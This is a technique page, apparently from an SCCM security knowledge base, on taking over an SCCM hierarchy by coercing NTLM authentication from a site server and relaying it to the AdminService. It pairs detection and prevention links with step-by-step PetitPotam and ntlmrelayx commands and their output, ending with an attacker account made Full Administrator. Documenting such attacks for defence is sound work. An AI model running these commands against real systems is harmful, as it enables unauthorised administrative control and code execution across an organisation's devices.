# TAKEOVER-5

## Description
Hierarchy Takeover via NTLM coercion and relay to AdminService on remote SMS Provider

## MITRE ATT&CK TTPs
- [TA0008](https://attack.mitre.org/tactics/TA0008) - Lateral Movement
- [TA0004](https://attack.mitre.org/tactics/TA0004) - Privilege Escalation

## Requirements

### Coercion
- Valid Active Directory domain credentials
- Connectivity to SMB (TCP/445) on a coercion target:
    - TAKEOVER-5.1: Coerce primary site server 
    - TAKEOVER-5.2: Coerce passive site server
- Connectivity from the coercion target to SMB (TCP/445) on the relay server
- Coercion target settings:
    - `BlockNTLM` = `0` or not present, or = `1` and `BlockNTLMServerExceptionList` contains attacker relay server [DEFAULT]
    - `RestrictSendingNTLMTraffic` = `0`, `1`, or not present, or = `2` and `ClientAllowedNTLMServers` contains attacker relay server [DEFAULT]
- Domain controller settings:
    - `RestrictNTLMInDomain` = `0` or not present, or is configured with any value and `DCAllowedNTLMServers` contains coercion target [DEFAULT]

### Relay
- Connectivity from the relay server to HTTPS (TCP/443) on the relay target hosting the SMS Provider role
- Relay target domain controller settings:
    - `RestrictNTLMInDomain` = `0` or not present, or is configured with any value and `DCAllowedNTLMServers` contains relay target [DEFAULT]
    - `LmCompatibilityLevel` < `5` or not present, or = `5` and LmCompatibilityLevel >= `3` on the coercion target [DEFAULT]

## Summary
The SMS Provider is a SCCM site server role installed by default on the site server when configuring a primary site or central administration site. The role can optionally be installed on additional SCCM site systems for high availability configurations. The SMS Provider is a Windows Management Instrumentation (WMI) provider that performs as an intermediary for accessing and modifying data stored in the site database. Access to the SMS Provider is controlled via membership of the the `SMS Admins` local security group on each site server. The site server computer account is a member of the `SMS Admins` security group on each SMS Provider in a site by default.

The SMS Provider also provides access to the site database via the administration service (AdminService) REST API and uses Microsoft Negotiate for authentication. In default configurations in versions prior to [2509](https://learn.microsoft.com/en-us/intune/configmgr/core/plan-design/changes/whats-new-in-version-2509#adminservice-now-rejects-ntlm-authentication), the AdminService is vulnerable to NTLM relay attacks.

## Impact
This technique may allow an attacker to relay a site server's domain computer account to a remote SMS Provider and elevate their privileges to "Full Administrator" for the SCCM hierarchy. If successful, this technique enables an attacker to execute arbitrary programs on any client device that is online as SYSTEM, the currently logged on user, or as a specific user when they next log on.

## Defensive IDs
- [DETECT-1: Monitor site server domain computer accounts authenticating from another source](../../../defense-techniques/DETECT/DETECT-1/detect-1_description.md)
- [DETECT-5: Monitor group membership changes for SMS Admins](../../../defense-techniques/DETECT/DETECT-5/detect-5_description.md)
- [DETECT-6: Monitor group membership changes for RBAC_Admins table](../../../defense-techniques/DETECT/DETECT-6/detect-6_description.md)
- [PREVENT-9: Enforce MFA for SMS Provider calls](../../../defense-techniques/PREVENT/PREVENT-9/prevent-9_description.md)
- [PREVENT-20: Block unnecessary connections to site systems](../../../defense-techniques/PREVENT/PREVENT-20/prevent-20_description.md)

> **Note:** Extended Protection for Authentication (EPA) is not currently supported by the AdminService (as of March 2024), so cannot be configured to prevent relay to the AdminService.
>
> **Update 1/21/2026:** Upgrading to version [2509](https://learn.microsoft.com/en-us/intune/configmgr/core/plan-design/changes/whats-new-in-version-2509#adminservice-now-rejects-ntlm-authentication) now prevents this attack by rejecting NTLM authentication at the SMS Provider AdminService.

## Subtechniques
- TAKEOVER-5.1: Coerce primary site server
- TAKEOVER-5.2: Coerce passive site server

## Examples

1. Use `SCCMHunter` to profile SCCM infrastructure:
    ```
    [02:00:25 PM] INFO     [+] Finished profiling all discovered computers.                                   
    [02:00:25 PM] INFO     +-------------------------+------------+-----------------+--------------+-------------------+---------------------+---------------+--------+---------+
                        | Hostname                | SiteCode   | SigningStatus   | SiteServer   | ManagementPoint   | DistributionPoint   | SMSProvider   | WSUS   | MSSQL   |
                        +=========================+============+=================+==============+===================+=====================+===============+========+=========+
                        | provider.internal.lab   | None       | False           | False        | False             | False               | True          | False  | False   |
                        +-------------------------+------------+-----------------+--------------+-------------------+---------------------+---------------+--------+---------+
                        | sccm.internal.lab       | LAB        | False           | True         | True              | False               | True          | False  | False   |
                        +-------------------------+------------+-----------------+--------------+-------------------+---------------------+---------------+--------+---------+       
    ```

2. On the attacker relay server, start `ntlmrelayx` (currently, Garrett Foster's [fork/pull request here](https://github.com/fortra/impacket/pull/1593) must be used until it is merged into impacket), targeting the URL of the AdminService API on the remote SMS Provider identified in the previous step, and provide a target account to add as a Full Administrator:
    ```
    └─# python3 ntlmrelayx.py --adminservice --logonname "lab\specter" --displayname "lab\specter" --objectsid <USER SID> -smb2support -t https://SMS_PROVIDER_URL_OR_IP/AdminService/wmi/SMS_Admin
    Impacket v0.10.1.dev1+20230802.213755.1cebdf31 - Copyright 2022 Fortra

    [*] Protocol Client SMB loaded..
    [*] Protocol Client IMAP loaded..
    [*] Protocol Client IMAPS loaded..
    [*] Protocol Client RPC loaded..
    [*] Protocol Client DCSYNC loaded..
    [*] Protocol Client MSSQL loaded..
    [*] Protocol Client LDAP loaded..
    [*] Protocol Client LDAPS loaded..
    [*] Protocol Client SMTP loaded..
    [*] Protocol Client HTTP loaded..
    [*] Protocol Client HTTPS loaded..
    [*] Running in relay mode to single host
    [*] Setting up SMB Server
    [*] Setting up HTTP Server on port 80
    [*] Setting up WCF Server
    [*] Setting up RAW Server on port 6666
    ```

3. From the attacker host, coerce NTLM authentication from the site server via SMB, targeting the relay server's IP address:
    ```
    ┌──(root㉿DEKSTOP-2QO0YEUW)-[/opt/PetitPotam]
    └─# python3 PetitPotam.py -u lowpriv -p P@ssw0rd <NTLMRELAYX_LISTENER_IP> <SITE_SERVER_IP> 

    Trying pipe lsarpc
    [-] Connecting to ncacn_np:10.10.100.121[\PIPE\lsarpc]
    [+] Connected!
    [+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
    [+] Successfully bound!
    [-] Sending EfsRpcOpenFileRaw!
    [-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
    [+] OK! Using unpatched function!
    [-] Sending EfsRpcEncryptFileSrv!
    [+] Got expected ERROR_BAD_NETPATH exception!!
    [+] Attack worked!
    ```

    After a few seconds, you should receive an SMB connection on the relay server that is forwarded to the AdminService on the SMS Provider to add a Full Administrator:
    ```
    ┌──(adminservice)─(root㉿DEKSTOP-2QO0YEUW)-[/opt/adminservice/examples]


    [*] Servers started, waiting for connections
    [*] SMBD-Thread-5 (process_request_thread): Received connection from 10.10.100.121, attacking target https://provider.internal.lab
    [*] Exiting standard auth flow to add SCCM admin...
    [*] Authenticating against https://provider.internal.lab as LAB/SCCM$
    [*] Skipping user SCCM$ since attack was already performed
    [*] Server returned code 201, attack successful
    ```

4. Confirm that the account now has the `Full Administrator` role by querying WMI on an SMS Provider:
    ```
    $ python3 sccmhunter.py  admin -u specter -p <PASSWORD> -ip SITE-SMS          

    [14:16:54] INFO     [!] Enter help for extra shell commands                                                                                                                                              
    () (C:\) >> show_admins
    [14:17:11] INFO     Tasked SCCM to list current SMS Admins.                                                                                                                                              
    [14:17:12] INFO     Current Full Admin Users:
    [14:17:13] INFO     lab\Administrator 
    [14:17:13] INFO     lab\specter 
    ```

## References
- Garrett Foster, [SCCMHunter](https://github.com/garrettfoster13/sccmhunter)
- Garrett Foster, [Site Takeover via SCCM's AdminService API](https://posts.specterops.io/site-takeover-via-sccms-adminservice-api-d932e22b2bf)
- Microsoft, [Plan for the SMS Provider](https://learn.microsoft.com/en-us/mem/configmgr/core/plan-design/hierarchy/plan-for-the-sms-provider)
- Microsoft, [What is the administration service in Configuration Manager?](https://learn.microsoft.com/en-us/mem/configmgr/develop/adminservice/overview)

